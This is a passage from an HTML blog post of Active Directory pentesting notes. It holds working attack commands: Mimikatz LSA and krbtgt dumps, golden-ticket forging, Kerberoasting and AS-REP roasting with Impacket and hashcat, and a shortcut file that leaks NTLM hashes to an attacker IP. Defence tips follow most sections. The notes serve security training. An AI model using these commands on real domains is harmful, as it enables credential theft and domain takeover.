</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"privilege::debug" "LSADump::LSA /inject" exit'</span><span class="w"> </span><span class="nt">-Computer</span><span class="w"> </span><span class="nx">HYDRA.marvel.local</span><span class="w">
</span></pre></table></code></div></div><h3 id="defence-4">Defence</h3><blockquote><ul><li>Limit user/group token creation permissions.<li>Account tiering.<li>local admin restriction.</ul></blockquote><hr /><h2 id="kerberoasting">Kerberoasting</h2><p>Shout-out to <strong>Mohit Panwar</strong>. Below notes are taken from his <a href="https://medium.com/@Shorty420/kerberoasting-9108477279cc">blog</a>.</p><h3 id="explanation-3">Explanation</h3><ol><li>When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows.<li>The DC sends the user a <code class="language-plaintext highlighter-rouge">Ticket Granting Ticket (TGT)</code> Kerberos ticket. The TGT is presented to any DC to <em>prove authentication</em> for Kerberos service tickets.<li>The user opens up Skype which causes the user’s workstation to lookup the <code class="language-plaintext highlighter-rouge">Service Principal Name (SPN)</code> for the user’s Exchange server.<li>Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate.<li>The DC replies with the <code class="language-plaintext highlighter-rouge">Ticket Granting Service (TGS)</code> Kerberos service ticket.<li>The user’s workstation presents the TGS to the Exchange server for access.<li>Skype connects successfully.</ol><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-13-54-21.png" alt="" /> <em>Kerberoasting in action</em></p><p><strong>Attack Method</strong></p><p>Once you have admin/standard user access, look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetUserSPNs.py <span class="nt">-request</span> <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;domain<span class="se">\u</span>ser&gt;
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-13-55-16.png" alt="" /> <em>TGS ticket dump from Attacker’s PC</em></p><p>Now once you have the <code class="language-plaintext highlighter-rouge">TGS hash</code>, all we need to do is to feed the hash to Hashcat tool to fetch Server’s user.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Hashcat -m 13100 &lt;hash_file&gt; &lt;rockyou wordlist&gt;
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-13-56-00.png" alt="" /></p><p><strong>Important note:</strong> <em>If any of the above test gives a negative result, keep an eye on your Wireshark traffic. Mostly setting up static DHCP or DNS or Gateway IP address solves such issues. This is a very small thing to underestimate which will affect the pentest in a peculiar way.</em></p><h3 id="defence-5">Defence</h3><blockquote><ul><li>If possible use group managed service accounts which have random, complex passwords (&gt;100 characters) and are managed automatically by Active Directory<li>Ensure all service accounts (user accounts with Service Principal Names) have long, complex passwords greater than 25 characters, preferably 30 or more. This makes cracking these password far more difficult.<li>Service Accounts with elevated AD permissions should be the focus on ensuring they have long, complex passwords.<li>Ensure all Service Account passwords are changed regularly</ul></blockquote><hr /><h2 id="as-rep-roasting">AS-REP Roasting</h2><p>There is an option for an account to have the property “Do not require Kerberos pre-authentication” or <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code> set to true. AS-REP Roasting is an attack against Kerberos for these accounts.</p><p>During pre-authentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request.</p><p>From there, the TGT will be issued for the user to use for future authentication. <em>If pre-authentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.</em></p><p>Luckily, pre-authentication is required by default in Active Directory.</p><p>Read More <a href="https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/">here</a>.</p><p>In my HackTheBox experience I have got <code class="language-plaintext highlighter-rouge">Kerberos ticket without a valid credentials.</code> We can use the script to output both the vulnerable usernames and their corresponding encrypted TGTs. <a href="https://ranakhalil101.medium.com/hack-the-box-forest-writeup-w-o-metasploit-63070c9020e4">Ref</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetNPUsers.py htb.local/ <span class="nt">-dc-ip</span> 10.10.10.161 <span class="nt">-request</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-14-02-04.png" alt="" /></p><p>The <code class="language-plaintext highlighter-rouge">Kerberos pre-authentication</code> option has been disabled for the above user svc-alfresco and the KDC gave us back a TGT encrypted with the user’s password.</p><hr /><h2 id="gpp--cpassword-attacks--ms14-025">GPP / cPassword Attacks / MS14-025</h2><h3 id="explanation-4">Explanation</h3><p>Group Policy Preferences allowed admins to create policies using embedded credentials. These credentials were encrypted and they were placed in XML document and they were stored in variable <code class="language-plaintext highlighter-rouge">"cPassword"</code>.</p><ul><li>They key was accidentally released.<li>Patched in MS14-025, but doesn’t prevent previous uses.<li>Look for <code class="language-plaintext highlighter-rouge">Groups.xml</code> or any interesting in XML file. Most of the time these credentials are domain admin credentials and will allow us access to domain admin accounts.</ul><p>More info on this is here <a href="https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">Group Policy Pwnage</a></p><p><em>Refer to <code class="language-plaintext highlighter-rouge">Active</code> machine walk-through in HackTheBox.</em></p><p><strong>Tools</strong> : <code class="language-plaintext highlighter-rouge">gpp-decrypt</code></p><hr /><h2 id="url-file-attack">url File Attack</h2><p>After compromising a user if User have access to any writeable file share. This can be utilized to capture more hashes via responder and possibly get credentials of any user with higher/different privileges.</p><blockquote><p>SCF Attack and url File attack uses same idea.</p></blockquote><p><strong>Attack Method</strong></p><ol><li>Run Responder on attacker machine. Then on target<li>Create one shortcut file with below text block.<li>While saving it save it as “All files”.<li>Put it in File Share with catchy name.<li>Wait for any other domain users to access that folder / file created.</ol><p>It will capture hashes.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
</pre></table></code></div></div><ul><li>where x.x.x.x = AttackerIP This block of code is of Internet shortcut.</ul><p>Refer <code class="language-plaintext highlighter-rouge">SCF and URL file attack against writeable share</code> section on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share">this repo</a>.</p><hr /><h2 id="printnightmare-cve-2021-1675">PrintNightmare (CVE-2021-1675)</h2><p><code class="language-plaintext highlighter-rouge">CVE-2021-1675</code> is a critical remote code execution and local privilege escalation vulnerability dubbed “PrintNightmare.”</p><blockquote><ul><li>This remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations.<li>An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</ul></blockquote><p><strong><em>Requires latest version of Impacket.</em></strong></p><h3 id="attack-methods-1">Attack Methods</h3><p>We can use <code class="language-plaintext highlighter-rouge">rpcdump.py</code> from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable.</p><p>And follow instructions from these two repos:</p><ul><li><a href="https://github.com/cube0x0/CVE-2021-1675">cube0x0 RCE</a><li><a href="https://github.com/calebstewart/CVE-2021-1675">calebstewart LPE</a></ul><hr /><h2 id="mimikatz">Mimikatz</h2><p>It’s now well known to extract plaintext passwords, hash, PIN code and kerberos tickets from memory.</p><p><code class="language-plaintext highlighter-rouge">mimikatz</code> can also perform pass-the-hash, pass-the-ticket or build Golden tickets.</p><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p><p><a href="https://github.com/gentilkiwi/mimikatz/releases">Mimikatz Binaries</a></p><p><em>Do check <code class="language-plaintext highlighter-rouge">mimikatz wiki</code> for info on other modules.</em></p><hr /><h2 id="golden-ticket-attacks--pass-the-ticket">Golden Ticket Attacks / Pass the Ticket</h2><p>A Golden Ticket attack is when an attacker has complete and unrestricted access to an entire domain — all computers, files, folders, and most importantly, the access control system itself.</p><blockquote><p>Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain’s Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).</p></blockquote><p><strong>Attack Method</strong></p><ol><li>capture <code class="language-plaintext highlighter-rouge">sid of domain</code> and <code class="language-plaintext highlighter-rouge">NTLM Hash of Kerberos TGT account</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>cmd&gt; mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
</pre></table></code></div></div><li>Now create Golden ticket.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mimikatz # kerberos::golden /User:real_or_fake_user /domain:marvel.local /sid:sid_of_domain /krbtgt:NTLM_Hash /id:500 /ptt
</pre></table></code></div></div><blockquote><p>Note : <code class="language-plaintext highlighter-rouge">RID 500 = Administrator</code> and <code class="language-plaintext highlighter-rouge">ptt = pass the ticket</code></p></blockquote><li>And finally pop a shell.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mimikatz # misc::cmd
</pre></table></code></div></div></ol><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-22-48-42.png" alt="" /> <em>For sid and NTLM hash</em></p><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-22-49-04.png" alt="" /> <em>golden ticket</em></p><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-22-49-11.png" alt="" /> <em>poping shell after golden ticket</em></p><ul><li>After this point we can use <code class="language-plaintext highlighter-rouge">psexec.exe</code> and gain access to this machine.<li>Golden ticket can also help us to create persistent.</ul><hr /><h2 id="zerologon">ZeroLogon</h2><h3 id="explanation-5">Explanation</h3><ul><li>Zerologon is a vulnerability in the cryptography of Microsoft’s Netlogon process/Netlogon Remote Protocol (MS-NRPC) that allows an attack against Microsoft Active Directory domain controllers.<li>Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller. It allows users to log on to servers that are using NT LAN Manager (NTLM).</ul><p>This is complex attack. It will set Domain Controller authentication to null. <strong>After running this attack if we do not restore the password we will break DC.</strong></p><blockquote><p>Use this repo for attack : <a href="https://github.com/dirkjanm/CVE-2020-1472">dirkjanm CVE-2020-1472</a></p></blockquote><p><em>Note : Requires the latest impacket from <a href="https://github.com/SecureAuthCorp/impacket">GitHub</a> with added netlogon structures. And Only works on Python 3.6 and newer!</em></p><p>Good reads are below</p><ul><li><a href="https://www.trendmicro.com/en_us/what-is/zerologon.html">What is ZeroLogon?</a><li><a href="https://github.com/dirkjanm/CVE-2020-1472">dirkjanm CVE-2020-1472</a><li><a href="https://github.com/SecuraBV/CVE-2020-1472">SecuraBV ZeroLogon Checker</a></ul><hr /><h1 id="relatedblogs">RelatedBlogs</h1><p>Do checkout these awesome blogs/articles. These were referred many times in PEH course. These can be really useful.</p><p><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin</a></p><p><a href="https://www.fox-it.com/nl-en/blog-6-mitm6-compromising-ipv4-networks-via-ipv6/">More on mitm6</a></p><p><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relays and Kerberos Delegation</a></p><p><a href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/">A Pen Tester’s Guide to Printer Hacking</a></p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/pentesting-notes/'>Pentesting Notes</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/activedirectory/" class="post-tag no-text-decoration" >ActiveDirectory</a> <a href="/tags/cve-2021-1675/" class="post-tag no-text-decoration" >CVE-2021-1675</a> <a href="/tags/cve-2020-1472/" class="post-tag no-text-decoration" >CVE-2020-1472</a> <a href="/tags/zerologon/" class="post-tag no-text-decoration" >ZeroLogon</a> <a href="/tags/printnightmare/" class="post-tag no-text-decoration" >PrintNightmare</a> <a href="/tags/ms14-025/" class="post-tag no-text-decoration" >MS14-025</a> <a href="/tags/ticket/" class="post-tag no-text-decoration" >Ticket</a> <a href="/tags/attacks/" class="post-tag no-text-decoration" >Attacks</a> <a href="/tags/kerberoasting/" class="post-tag no-text-decoration" >Kerberoasting</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >Bloodhound</a> <a href="/tags/powerview/" class="post-tag no-text-decoration" >PowerView</a> <a href="/tags/mitm6/" class="post-tag no-text-decoration" >MITM6</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Attacking Active Directory - Akash Hansda&url=https://akashjx.github.io/posts/01-NotesActiveDirectory/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Attacking Active Directory - Akash Hansda&u=https://akashjx.github.io/posts/01-NotesActiveDirectory/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Attacking Active Directory - Akash Hansda&url=https://akashjx.github.io/posts/01-NotesActiveDirectory/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/03_Grandpa/">Grandpa Writeup</a><li><a href="/posts/01-Legacy/">Legacy Writeup</a><li><a href="/posts/02-Blue/">Blue Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/oscp/">OSCP</a> <a class="post-tag" href="/tags/tjnullslist/">TJNULLsList</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/activedirectory/">ActiveDirectory</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/kerberoasting/">Kerberoasting</a> <a class="post-tag" href="/tags/ms17-010/">MS17-010</a> <a class="post-tag" href="/tags/attacks/">Attacks</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/04-Active/"><div class="card-body"> <span class="timeago small" >Jan 5<i class="unloaded">2022-01-05T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Writeup</h3><div class="text-muted small"><p> In this writeup I have pwned Active from hackthebox. This was Active Directory Box pwned using some impacket tools. Good starter box for learning AD hacking. Enumeration rustscan rustscan --ac...</p></div></div></a></div><div class="card"> <a href="/posts/03_Grandpa/"><div class="card-body"> <span class="timeago small" >Dec 31, 2021<i class="unloaded">2021-12-31T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Grandpa Writeup</h3><div class="text-muted small"><p> In this writeup I have pwned Grandpa from hackthebox with manual exploit and metasploit exploit. Target was vulnerable with CVE-2017-7269. Enumeration rustscan rustscan --accessible --ulimit 5...</p></div></div></a></div><div class="card"> <a href="/posts/02-Blue/"><div class="card-body"> <span class="timeago small" >Dec 29, 2021<i class="unloaded">2021-12-29T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blue Writeup</h3><div class="text-muted small"><p> In this writeup I have pwned Legacy from hackthebox with Eternal blue exploit. Using manual and metasploit exploit. Enumeration rustscan rustscan --accessible -a 10.129.179.6 -- -Pn -p- rust...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/04-Active/" class="btn btn-outline-primary" prompt="Older"><p>Active Writeup</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/aakashJx">Akash Hansda</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/oscp/">OSCP</a> <a class="post-tag" href="/tags/tjnullslist/">TJNULLsList</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/activedirectory/">ActiveDirectory</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/kerberoasting/">Kerberoasting</a> <a class="post-tag" href="/tags/ms17-010/">MS17 010</a> <a class="post-tag" href="/tags/attacks/">Attacks</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
